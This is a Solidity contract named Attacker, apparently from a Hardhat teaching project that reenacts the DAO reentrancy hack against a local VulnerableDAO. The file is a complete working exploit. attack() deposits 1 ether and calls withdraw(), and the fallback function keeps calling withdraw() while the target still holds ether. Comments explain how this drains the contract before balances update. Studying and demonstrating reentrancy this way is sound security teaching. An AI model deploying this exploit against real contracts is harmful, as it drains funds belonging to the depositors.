// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the VulnerableDAO contract
import "./IDAO.sol";

// Import Hardhat's console library
import "hardhat/console.sol";

contract Attacker {
    IDAO dao;

    string internal daoContractName;

    constructor(address _daoAddress) {
        dao = IDAO(_daoAddress);

        // DEBUG: Log the contract details for debugging
        daoContractName = dao.contractName();
        console.log("Attacker contract initialized");
        console.log("Target DAO contract address:", _daoAddress);
        console.log("DAO contract name (inferred)", daoContractName);
    }

    /* Attack function to initiate the attack.
     - Deposits the hacker's 'investment' into The DAO
     - Then initiates the attack by calling The DAO contract’s withdraw() function. 
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum attack amount is 1 ETH");
        console.log("Attacker#attack(): DAO contract name: ", daoContractName);

        dao.deposit{value: 1 ether}();
        dao.withdraw();
    }

    /* Fallback function that re-enters the VulnerableDAO's withdraw function.
    The fallback function contains malicious code: 
    - checks whether there is still ETH remaining in The DAO contract and then calls The DAO contract’s withdraw() function. 
    - We saw earlier that the DAO contract’s withdraw() function does not update the account balance because the ETH-sending transaction is still executing. 
    - This transaction continues to execute because the hacker’s fallback function keeps calling withdraw(), thereby draining all of the ETH from The DAO contract without altering the balances state variable. 
    - Once The DAO contract’s ETH balance is drained, the fallback() function will no longer execute the withdraw() function, and the fallback() function execution will complete. Only then will the hacker’s account balance be set to zero, by which time The DAO will have no ETH left.
     */
    fallback() external payable {
        console.log("Attacker#fallback(): DAO contract name: ", daoContractName);

        if (address(dao).balance >= 1 ether) {
            console.log("\tinvoking dao.withdraw()...");
            dao.withdraw();
        }
    }

    // Get contract balance
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
